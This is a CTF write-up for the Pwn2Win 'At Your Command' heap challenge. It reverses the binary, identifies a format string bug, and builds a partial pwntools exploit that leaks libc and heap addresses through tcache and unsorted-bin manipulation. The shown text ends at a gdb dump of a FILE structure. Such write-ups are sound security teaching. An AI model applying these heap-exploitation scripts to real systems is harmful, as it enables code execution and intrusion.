@@ -1,0 +1,580 @@
+I"��<p>We had a great time playing Pwn2Win CTF held this weekend. I spent most of my time in solving the challenge <strong>At Your Command</strong>.</p>
+
+<h2 id="tldr-of-the-challenge-binary">TL;DR OF THE CHALLENGE BINARY</h2>
+
+<p>The binary is a standard CTF-style <code class="language-plaintext highlighter-rouge">x86 64-bit Dynamically Linked</code> executable.
+We’ve been given the binary as well as glibc 2.27 to start with.</p>
+
+<p>Here’s the output of <em>checksec</em>.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : FULL
+
+</code></pre></div></div>
+
+<p>Without any further delay , let’s get into reversing the binary.</p>
+
+<h2 id="reversing">REVERSING</h2>
+
+<p>Initially the binary takes a <strong>name</strong> string of size 12 bytes as input.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">printf</span><span class="p">(</span><span class="s">"Your name: "</span><span class="p">,</span> <span class="n">a2</span><span class="p">);</span>
+ <span class="n">v6</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">12uLL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>And then we are directed to a standard Menu-Driven program.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">command_menu</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_5555555555FA</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Choose an option:"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"1. Include command"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"2. Review command"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"3. Delete command"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"4. List commands"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"5. Send commands"</span><span class="p">);</span>
+  <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Let’s see what each functionality has to do.</p>
+
+<ul>
+  <li><strong>Include Command</strong> aka ADD :
+    <ol>
+      <li>Can Allocate 10 chunks at max.</li>
+      <li>Stores heap pointers in an array located in stack.</li>
+      <li>Calls malloc of size <strong>0x188</strong>.</li>
+      <li>Asks for <strong>Priority</strong> which is a <em>long long integer</em> and places it in the first 8 bytes of the malloc’d chunk.</li>
+      <li>Then reads input of size <strong>0x170</strong> from the next memory location in heap after Priority.</li>
+    </ol>
+  </li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-1Ch]</span>
+  <span class="kt">ssize_t</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]</span>
+
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">9</span> <span class="p">)</span>
+      <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">"[INFO] The authorized limit has been reached!"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x188uLL</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Priority: "</span><span class="p">);</span>
+  <span class="o">**</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="n">get_int_0</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Command: "</span><span class="p">);</span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">),</span> <span class="mh">0x170uLL</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">+</span> <span class="n">v3</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
+      <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">+</span> <span class="n">v3</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="nf">printf</span><span class="p">(</span><span class="s">"The command has been included at index %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+</code></pre></div></div>
+
+<ul>
+  <li><strong>View</strong>
+    <ol>
+      <li>Views the chunk at the requested index.</li>
+    </ol>
+  </li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+  <span class="n">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rax</span>
+  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Command index: "</span><span class="p">);</span>
+  <span class="n">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="n">get_int</span><span class="p">();</span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">9</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">v1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v1</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_5555555555FA</span><span class="p">);</span>
+      <span class="n">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="n">print_name_0</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v3</span> <span class="o">+</span> <span class="n">a1</span><span class="p">));</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li><strong>Delete</strong>
+    <ol>
+      <li>It frees the chunk at the requested index and also <strong>NULLS</strong> out the pointer on stack.</li>
+      <li>Hence no UAF.</li>
+    </ol>
+  </li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rax</span>
+  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Command index: "</span><span class="p">);</span>
+  <span class="n">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="n">get_int</span><span class="p">();</span>
+  <span class="n">v3</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">v1</span> <span class="o">&lt;=</span> <span class="mi">9</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">v1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v1</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v3</span> <span class="o">+</span> <span class="n">a1</span><span class="p">));</span>
+      <span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">v3</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+      <span class="n">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">"The command has been successfully deleted"</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">v1</span><span class="p">;</span>
+
+</code></pre></div></div>
+
+<ul>
+  <li><strong>List</strong>
+    <ol>
+      <li>Prints out content of all existing chunks.</li>
+    </ol>
+  </li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rax</span>
+  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-4h]</span>
+
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">v1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_5555555555FA</span><span class="p">);</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"Index %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+      <span class="n">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="n">print_name_0</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">));</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">v1</span><span class="p">;</span>
+
+</code></pre></div></div>
+
+<p>We can return from the Menu driven code by sending a <strong>5</strong> and then something interesting happens.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">v3</span> <span class="o">=</span> <span class="n">time</span><span class="p">(</span><span class="mi">0LL</span><span class="p">);</span>
+  <span class="n">snprintf</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="mh">0x2DuLL</span><span class="p">,</span> <span class="s">"/commands/%ld"</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
+  <span class="n">stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">modes</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>The binary opens a file with the name as return value of <strong>time(0)</strong> which is pretty cool.</p>
+
+<p>Then it calls another function which does some operations on the file.</p>
+
+<p>Here , the binary asks for yet another input of a long long integer but there’s a twist here.</p>
+
+<p>Let’s see what that is.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    0000555555555299                 call    get_int_0
+    000055555555529E                 cdqe
+</code></pre></div></div>
+
+<p>There’s a <strong>cdqe</strong> instruction which will make our long long integer into 4 bytes.</p>
+
+<p>So if we think of giving a valid address there , its not something u want to do.</p>
+
+<p>Moving on , we have calls to fprintf to copy all our chunks’ data into the file that was opened previously.</p>
+
+<p class="notice"><strong>NOTICE</strong> We should remember that <em>fprintf</em> internally calls malloc again.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fprintf</span><span class="p">(</span><span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="s">"Id: %lld</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v2</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="p">)</span>
+      <span class="n">fprintf</span><span class="p">(</span><span class="o">*</span><span class="n">v4</span><span class="p">,</span> <span class="s">"%lld:%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">**</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">),</span> <span class="o">*</span><span class="p">(</span><span class="mi">8LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">);</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Just after that , we have a vulnerable snprintf coming through.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">snprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">src</span><span class="p">,</span><span class="mh">0xc</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Reminding you that <strong>buf</strong> was the initial name that we entered on bss and <strong>src</strong> is a local variable located at <strong>[rbp-0x30]</strong>.</p>
+
+<p>As there is no format specifier , our buf acts as the format specifier and thus we have the infamous <strong>Format String Vulnerability</strong>.</p>
+
+<p>We copy our 12 bytes of buf to src.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="o">*&amp;</span><span class="n">s</span> <span class="o">=</span> <span class="s">" .rM"</span><span class="p">;</span>
+   <span class="n">v8</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+   <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span><span class="o">&amp;</span><span class="n">src</span><span class="p">);</span>
+   <span class="n">printf</span><span class="p">(</span><span class="s">"You command %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Here <strong>s</strong> is an <em>char</em> array located at <strong>[rbp-0x20]</strong>.</p>
+
+<p><strong>strcat</strong> will concatenate <em>s</em> with <em>src</em> but here we will not run into any buffer overrruns because even after concatenating, we will not reach out of bounds.</p>
+
+<p>After all this is done ,<strong>fclose</strong> is called on the stream in the end.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fclose</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Now that we have reversed the binary , let us start writing exploit.</p>
+
+<h2 id="exploit-development">EXPLOIT DEVELOPMENT</h2>
+
+<h3 id="setting-up-the-local-environment">Setting up the Local Environment</h3>
+
+<p>For those of you who dont want another <code class="language-plaintext highlighter-rouge">/commands</code> folder in your root directory can simply edit the binary using ghex just the way it is done for preloading Libc.</p>
+
+<p>We edit the string <strong>/commands/%lld</strong> in ghex with <strong>./ommands/%lld</strong> and create a folder <em>ommands</em> in the PWD.</p>
+
+<p>To make sure that a file with name <strong>./ommands/time(0)</strong> exists in that directory , we can use the <strong>ctypes</strong> python library and get the value of <strong>time(0)</strong> which we can pass to os.system and touch a file with that name to create it.</p>
+
+<p>Here’s the script to get things started with all wrapper functions.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">ctypes</span>
+<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span>
+
+<span class="k">def</span> <span class="nf">setup_env</span><span class="p">():</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">cdll</span><span class="p">.</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+    <span class="n">LIBC</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+    <span class="n">time</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">time</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"touch ./ommands/{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">time</span><span class="p">))</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">'command.pwn2.win'</span><span class="p">,</span><span class="mi">1337</span><span class="p">)</span>
+    <span class="n">context</span><span class="p">.</span><span class="n">noptrace</span><span class="o">=</span><span class="bp">True</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">"./command"</span><span class="p">,</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="s">"./libc.so.6"</span><span class="p">})</span>
+    <span class="n">setup_env</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">send_name</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">'Your name: '</span><span class="p">,</span><span class="n">name</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">priority</span><span class="p">,</span><span class="n">command</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'Priority: '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">priority</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">'Command: '</span><span class="p">,</span><span class="n">command</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'index: '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'3'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'index: '</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">list</span><span class="p">():</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'4'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">ret</span><span class="p">():</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">'5'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">send_commands</span><span class="p">(</span><span class="n">ID</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'which rbs?</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">ID</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'You command Mr. '</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+    
+</code></pre></div></div>
+
+<h3 id="memory-leaks">MEMORY LEAKS</h3>
+
+<p>We have malloc and we have tcache. That’s enough to get libc right? But how?</p>
+
+<p>So here’s the idea , we allocate 8 chunks , free 8 chunks , now 7 of them go into tcache and one remaining chunk goes into unsorted bin.</p>
+
+<p>Now we can add back 7 chunks and consume all tcache , and adding one more will give us our unsorted bin chunk which we can read.</p>
+
+<p>Reminding you that we have first 8 bytes on any malloc’d chunk exclusively reserved for <strong>Priority</strong>.</p>
+
+<p>In order to get our beloved libc leak , we first need to make sure that all 8 bytes of <strong>Priority</strong> are occupied. This can be achieved by simply giving a size larger than 4 bytes which would trick <strong>cdqe</strong> into thinking it as negetive and thus filling up all 8 bytes of Priority.</p>
+
+<p>Wait , what about Heap??</p>
+
+<p>If we send two different chunks to unsorted bin , we can get unsorted bin chunks, one of whose bk pointer is heap.</p>
+
+<p>Nice , so let’s script it a bit.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">send_name</span><span class="p">(</span><span class="s">'aaaaa'</span><span class="p">)</span>
+
+    <span class="c1">#Initially we allocate 10 chunks
+</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span> 
+        <span class="n">add</span><span class="p">(</span><span class="mi">123</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+    
+    <span class="c1">#Then we start filling tcache from 3rd chunk
+</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">10</span><span class="p">):</span>
+        <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="c1">#These two chunks go into unsorted bin chunks without merging.
+</span>    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="c1">#Now we consume all 7 tcache chunks that we first filled
+</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+        <span class="n">add</span><span class="p">(</span><span class="mi">123123</span><span class="p">,</span><span class="s">'fill_tcache'</span><span class="p">)</span>
+    <span class="c1">#Finally , we get back our unsorted bin chunks whose bk pointers will give heap and libc.
+</span>    <span class="n">add</span><span class="p">(</span><span class="s">'123456789123'</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="s">'123456789123'</span><span class="p">,</span><span class="s">'a'</span><span class="p">)</span>
+    <span class="n">view</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+    <span class="c1">#Libc
+</span>    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Command: '</span><span class="p">)</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x3ebc61</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc_base = "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x10a38c</span>
+    <span class="c1">#Heap
+</span>    <span class="n">view</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Command: '</span><span class="p">)</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x561</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"heap_base = "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+   
+</code></pre></div></div>
+
+<p>Now that we have the necessary leaks , let us return from our Menu Driven subroutine and execute the rest of the code.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">ret</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>From here , we need help of our old friend , yes you guessed it right , <strong>gdb</strong>.</p>
+
+<p>This is how the file structure created by fopen looks like.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>
+0x555555758070:	0x00000000fbad2c84	0x00005555557582a0 
+0x555555758080:	0x00005555557582a0	0x00005555557582a0
+0x555555758090:	0x00005555557582a0	0x0000555555758439
+0x5555557580a0:	0x00005555557592a0	0x00005555557582a0
+0x5555557580b0:	0x00005555557592a0	0x0000000000000000
+0x5555557580c0:	0x0000000000000000	0x0000000000000000
+0x5555557580d0:	0x0000000000000000	0x00007ffff7dd0680
+0x5555557580e0:	0x0000000000000003	0x0000000000000000
+0x5555557580f0:	0x0000000000000000	0x0000555555758150
+0x555555758100:	0xffffffffffffffff	0x0000000000000000
+0x555555758110:	0x0000555555758160	0x0000000000000000
+0x555555758120:	0x0000000000000000	0x0000000000000000
+0x555555758130:	0x00000000ffffffff	0x0000000000000000
+0x555555758140:	0x0000000000000000	0x00007ffff7dcc2a0
+0x555555758150:	0x0000000000000000	0x0000000000000000
+0x555555758160:	0x0000000000000000	0x0000000000000000
+0x555555758170:	0x0000000000000000	0x0000000000000000
+0x555555758180:	0x0000000000000000	0x0000000000000000
+0x555555758190:	0x0000000000000000	0x0000000000000000
+0x5555557581a0:	0x0000000000000000	0x0000000000000000
+0x5555557581b0:	0x0000000000000000	0x0000000000000000
+0x5555557581c0:	0x0000000000000000	0x0000000000000000
+0x5555557581d0:	0x0000000000000000	0x0000000000000000
